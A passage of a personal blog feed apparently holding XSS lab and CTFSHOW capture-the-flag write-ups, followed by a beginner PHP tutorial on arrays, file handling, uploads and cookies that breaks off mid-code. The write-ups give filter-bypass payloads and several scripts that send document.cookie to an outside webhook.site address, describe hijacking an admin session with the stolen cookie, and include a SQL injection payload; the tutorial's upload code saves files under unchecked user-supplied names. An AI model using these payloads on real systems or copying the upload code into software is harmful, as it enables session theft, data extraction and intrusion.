title="Less-6"></a>Less-6</h3><p>source：</p><p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p><p>限制很多·······，不过没有大小写转换，而HTML对大小写不敏感。</p><p>语句：</p><p><code>&quot;&gt;&lt;a HREF=javascript:alert(1)&gt;hi&lt;/a&gt;//</code></p><h3 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h3><p>source：</p><p><code>$str =strtolower( $_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p><p>大小于号不过滤都好写。</p><p>语句：</p><p><code>&quot;&gt;&lt;sscriptcript&gt;alert(1)&lt;/sscriptcript&gt;//</code></p><p><code>&quot; oonnclick=alert(1)&gt;//</code></p><p><code>&quot;&gt;&lt;a hhrefref=javasscriptcript:alert(1)&gt;hi&lt;/a&gt;//</code></p><h3 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h3><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p><p><code>$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</code></p><p><code>&lt;input name=keyword  value=&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</code></p><p> <code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code></p><p>须知：</p><p>在表单输入框里输入的数据会在url框里进行一次编码</p><p>url框里显示的数据中的汉字实际上在传输时会被url编码</p><p>语句：javascr%09ipt:alert(1)</p><p>须知：须在url框里，因为表单输入框会进行一次url编码，结果没有是空格的。其实在表单输入框里原样输入即可，但是空格输入后会变成加号。</p><p>分析：按照常理应该在input里搞事情，但是htmlspecialchars()函数阻止了该操作，但是可以在echo里操作。另外，虽然在代码中有水平制表符，但是不会影响，代码会忽略它。</p><h3 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h3><p>须知：</p><blockquote><p>在 HTML 中，无论字符串是否被单引号或双引号包裹，<code>javascript:</code> 伪协议依然会被浏览器解释并执行。引号的使用主要是用于区分 HTML 属性的开始和结束，而不会影响到伪协议的执行。</p></blockquote><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code></p><p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code></p><p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code></p><p><code>$str7=str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</code></p><p><code>&lt;?php</code></p><p><code>if(false===strpos($str7,&#39;http://&#39;))&#123;</code> </p><p><code>echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;</code></p><p> <code>&#125;else&#123;</code></p><p> <code>echo &#39;&lt;center&gt;&lt;BR&lt;a href=&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;;&#125;?&gt;</code></p><p>语句：</p><p><code>javascr%09ipt:alert(1)//http://</code><br><code>javasc%09ript:alert(&#39;http://&#39;);</code></p><h3 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h3><p>source：</p><p><code>$str11 = $_GET[&quot;t_sort&quot;];</code></p><p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p><p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p><p><code>&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p><p>语句：</p><p><code>t_sort=&quot;  type=&quot;text&quot; onclick=alert(1)  id=&quot;</code></p><p>须知：相同属性值，前面那一个生效。</p><h3 id="Less-11-Less-12-Less-13"><a href="#Less-11-Less-12-Less-13" class="headerlink" title="Less-11 Less-12 Less-13"></a>Less-11 Less-12 Less-13</h3><p>source：</p><p><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];</code></p><p>&#x2F;&#x2F;Less-12是UA，Less-13是Cookie</p><p><code>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</code></p><p><code>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</code></p><p><code>&lt;input name=&quot;t_ref&quot;  value=&quot;&#39;.$str33.&#39;&quot; type=&quot;hidden&quot;&gt;</code></p><p>注入到请求头里面。</p><p>语句：</p><p><code>&quot; type=&#39;text&#39; onclick=alert(1) id=&quot;</code></p><h3 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h3><p>Less-14涉及exif xss</p><p>由于网站原因，不写这题</p><h3 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h3><p>本题涉及ng-include包含</p><p>source：</p><p><code>$str = $_GET[&quot;src&quot;];</code></p><p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p><p>语句：</p><p><code>src=&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;</code></p><p><code>echo &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;&#39;level1.php?name=&lt;img src=x onerror=alert(1)&gt;&#39;&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;</code></p><p>这段代码可以，但我不懂为什么两个单引号不报错</p><h3 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h3><p>source：</p><p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p><p><code>$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);</code></p><p><code>$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);</code></p><p><code>$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);</code></p><p><code>$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);</code></p><p><code>echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</code></p><p>大小写绕过失效，script、&#x2F;、空格等都被转换成&amp;nbsp，可以尝试使用%0a代替空格来进行绕过</p><p>语句：</p><p><code>&lt;img%0asrc=1%0aonerror=alert(1)&gt;</code></p><h3 id="Less-17-Less-18"><a href="#Less-17-Less-18" class="headerlink" title="Less-17 Less-18"></a>Less-17 Less-18</h3><p>source：</p><p><code>echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;</code></p><p>语句：</p><p><code>?arg01=a&amp;arg02=b onmouseover=alert(1)</code></p><p>原理不懂，引用：</p><blockquote><ul><li><code>&lt;embed&gt;</code>：HTML 标签，用于嵌入外部资源，如 Flash 文件。</li><li><code>src=xsf02.swf?&quot;a&quot;=&quot;b onmouseover=alert(1)&quot;</code>：这部分构建了 SWF 文件的 URL。在这里，<code>a</code> 被赋值为 <code>b onmouseover=alert(1)</code>。这可能导致在页面上嵌入的 Flash 文件中触发一个 JavaScript 弹窗，即执行了 <code>alert(1)</code>。</li><li><code>width=100% height=100%</code>：指定嵌入的 SWF 文件的宽度和高度为 100%。</li></ul></blockquote><hr><h2 id="CTFSHOW-WEB入门-XSS闯关"><a href="#CTFSHOW-WEB入门-XSS闯关" class="headerlink" title="CTFSHOW WEB入门 XSS闯关"></a>CTFSHOW WEB入门 XSS闯关</h2><h3 id="316"><a href="#316" class="headerlink" title="316"></a>316</h3><p>尝试<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，正常弹窗，没有过滤</p><p>payload：</p><p><code>&lt;script&gt;window.open(&#39;https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=&#39;+document.cookie)&lt;/script&gt;</code></p><h3 id="317-318-319"><a href="#317-318-319" class="headerlink" title="317 318 319"></a>317 318 319</h3><p>317过滤了script，318过滤了img</p><p>方法1：失败</p><p><code>&lt;img src=1 onerror=alert(1)&gt;</code>成功</p><p>payload：</p><p><code>&lt; img src=1 onload=&quot;window.open(&#39;https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=&#39;+document.cookie)&quot;&gt;</code></p><p>但是这得到的是本地cookie</p><p>方法2：成功</p><p><code>&lt;body onload=alert(1)&gt;&lt;/body&gt;</code>成功</p><p>payload：</p><p><code>&lt;body onload=&quot;window.open(&#39;https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=&#39;+document.cookie)&quot;&gt;&lt;/body&gt;</code></p><p>须知：onload可以执行JavaScript代码，当script被过滤后可以尝试使用它。</p><h3 id="320–326"><a href="#320–326" class="headerlink" title="320–326"></a>320–326</h3><p>空格过滤了，用&#x2F;**&#x2F;</p><p>payload：</p><p><code>&lt;body/**/onload=&quot;window.open(&#39;https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie=&#39;+document.cookie)&quot;&gt;&lt;/body&gt;</code></p><h3 id="327"><a href="#327" class="headerlink" title="327"></a>327</h3><p>一直网络拥堵，唉。</p><h3 id="328"><a href="#328" class="headerlink" title="328"></a>328</h3><p>先得到admin的cookie：将用户名或者密码进行xss注入，payload：</p><script>window.open('https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?cookie='+document.cookie)</script><p>可以在网站上得到admin的cookie，在控制台的application里改cookie，然后刷新即可。</p><h3 id="329"><a href="#329" class="headerlink" title="329"></a>329</h3><p>payload：</p><p><code>&lt;body/**/onload=window.open(&#39;https://webhook.site/ac69b076-197f-4cd9-8ff4-8e7554f4be69/?a=&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;))&gt;&lt;/body&gt;</code></p><h3 id="330"><a href="#330" class="headerlink" title="330"></a>330</h3><p><code>&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,&#39;g&#39;),1,&#39;h&#39;),2,&#39;i&#39;),3,&#39;j&#39;),4,&#39;k&#39;),5,&#39;l&#39;),6,&#39;m&#39;),7,&#39;n&#39;),8,&#39;o&#39;),9,&#39;p&#39;) from ctfshow_user4</code></p>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP入门</title>
      <link href="/2024/03/18/PHP%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/PHP%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="PHP入门"><a href="#PHP入门" class="headerlink" title="PHP入门"></a>PHP入门</h1><h2 id="基础教程"><a href="#基础教程" class="headerlink" title="基础教程"></a>基础教程</h2><p>基础教程以后再补，先上高级教程。</p><h3 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h3><h2 id="高级教程"><a href="#高级教程" class="headerlink" title="高级教程"></a>高级教程</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><h4 id="高维数组"><a href="#高维数组" class="headerlink" title="高维数组"></a>高维数组</h4><p>给代码，慢慢悟</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$men</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;bcd&#x27;</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;bnc&#x27;</span>,<span class="string">&#x27;acc&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$men</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$women</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;pq&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;pp&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;bcd&#x27;</span>)</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">&#x27;xq&#x27;</span>=&gt;<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;pp&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="string">&#x27;abc&#x27;</span>,<span class="string">&#x27;bcd&#x27;</span>)</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$women</span>);</span><br></pre></td></tr></table></figure><h4 id="date函数"><a href="#date函数" class="headerlink" title="date函数"></a>date函数</h4><p>例子：date(‘?,?,?’)，?是规定的字符。其间的逗号是连接符，可以用其他的符号代替。</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>要求：主文件的后缀必须是.php，也就是主文件必须是PHP文件。</p><p>类型：include，require</p><blockquote><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 生成一个致命错误（E_COMPILE_ERROR），在错误发生后脚本会停止执行。</li><li>include 生成一个警告（E_WARNING），在错误发生后脚本会继续执行。</li></ul></blockquote><p><strong>原理：被包含文件代码会在相应位置执行，该特点决定了代码逻辑。</strong></p><h3 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h3><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>对应函数：<strong>fopen()</strong></p><p>语法：fopen(‘path’, ‘mode’)，此函数的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件</p><p>引用：模式参数表</p><blockquote><table><thead><tr><th>r</th><th>只读。在文件的开头开始。</th></tr></thead><tbody><tr><td>r+</td><td>读&#x2F;写。在文件的开头开始。</td></tr><tr><td>w</td><td>只写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td>w+</td><td>读&#x2F;写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td>a</td><td>追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。</td></tr><tr><td>a+</td><td>读&#x2F;追加。通过向文件末尾写内容，来保持文件内容。</td></tr><tr><td>x</td><td>只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr><tr><td>x+</td><td>读&#x2F;写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr></tbody></table><p><strong>注释：</strong>如果 fopen() 函数无法打开指定文件，则返回 0 (false)。</p></blockquote><h4 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h4><p>对应函数：fclose()</p><p>语法：fclose($file)</p><h4 id="检测文件末尾（EOF）"><a href="#检测文件末尾（EOF）" class="headerlink" title="检测文件末尾（EOF）"></a>检测文件末尾（EOF）</h4><p>feof() 函数检测是否已到达文件末尾（EOF）。</p><p>语法：feof($file)</p><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>逐行读取文件：fgets($file)</p><p>逐字读取文件：fgetc($file)</p><p>任意读取文件：fread()</p><p>语法：fread($file, int $length)</p><p>例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;example.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="title function_ invoke__">filesize</span>(<span class="string">&#x27;example.txt&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br></pre></td></tr></table></figure><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h4><p>分为两个模块：HTML表单，PHP</p><p>HTML表单：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>FORM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;update.php&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        filename：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><ul><li><strong><form></strong> 标签的 <strong>enctype</strong> 属性规定了在提交表单时要使用哪种内容类型。在表单需要二进制数据时，比如文件内容，请使用 “<strong>multipart&#x2F;form-data</strong>“。</li><li><strong><input></strong> 标签的 <strong>type&#x3D;”file”</strong> 属性规定了应该把输入作为文件来处理。举例来说，当在浏览器中预览时，会看到输入框旁边有一个浏览按钮。</li></ul></blockquote><p>PHP：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#ini_set(&#x27;display_errors&#x27;, 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>通过使用 PHP 的全局数组 $_FILES，你可以从客户计算机向远程服务器上传文件。</p><p>第一个参数是表单的 input name，第二个下标可以是 “name”、”type”、”size”、”tmp_name” 或 “error”。如下所示：</p><ul><li>$_FILES[“file”][“name”] - 上传文件的名称</li><li>$_FILES[“file”][“type”] - 上传文件的类型</li><li>$_FILES[“file”][“size”] - 上传文件的大小，以字节计</li><li>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称</li><li>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</li></ul></blockquote><h4 id="保存"><a href="#保存" class="headerlink" title="保存"></a>保存</h4><p>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">#ini_set(&#x27;display_errors&#x27;, 0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;错误：&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传文件名: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件类型: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件大小: &quot;</span> . (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; kB&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;文件临时存储的位置: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; 文件已经存在。 &quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附：文件夹upload需要先存在。</p><h3 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h3><h4 id="创建Cookie"><a href="#创建Cookie" class="headerlink" title="创建Cookie"></a>创建Cookie</h4><p>语法：setcookie(name, value, expire, path, domain)</p><p>须知：setcookie() 函数必须位于 <html> 标签之前。</p><p>示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">setcookie</span>(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;pq&#x27;</span>, <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">5</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">······</span><br></pre></td></tr></table></figure><h4 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span 